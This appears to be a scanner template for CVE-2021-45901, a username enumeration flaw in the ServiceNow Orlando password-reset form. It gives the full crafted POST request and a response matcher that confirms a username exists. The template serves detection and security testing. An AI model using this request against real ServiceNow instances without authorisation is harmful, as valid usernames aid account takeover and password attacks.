id: CVE-2021-45901

info:
  name: ServiceNow Orlando Username Enumeration
  author: ProjectDiscoveryAI
  severity: medium
  description: The password-reset form in ServiceNow Orlando provides different responses to invalid authentication attempts depending on whether the username exists.

http:
  - method: POST
    path:
      - "{{BaseURL}}/$pwd_reset.do?sysparm_url=ss_default"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
      Accept: */*
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Connection: keep-alive
      Referer: "{{BaseURL}}/$pwd_reset.do?sysparm_url=ss_default"
      Cookie: glide_user_route={{glide_user_route}}; JSESSIONID={{JSESSIONID}}

    body: |
      sysparm_processor=PwdAjaxVerifyIdentity&sysparm_scope=global&sysparm_want_session_messages=true&sysparm_name=verifyIdentity&sysparm_process_id=c6b0c20667100200a5a0f3b457415ad5&sysparm_processor_id_0=fb9b36b3bf220100710071a7bf07390b&sysparm_user_id_0={{username}}&sysparm_identification_number=1&sysparam_pwd_csrf_token={{CSRF_Token}}&ni.nolog.x_referer=ignore&x_referer=$pwd_reset.do?sysparm_url=ss_default

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Username is correct but password is incorrect"
        part: body
        condition: and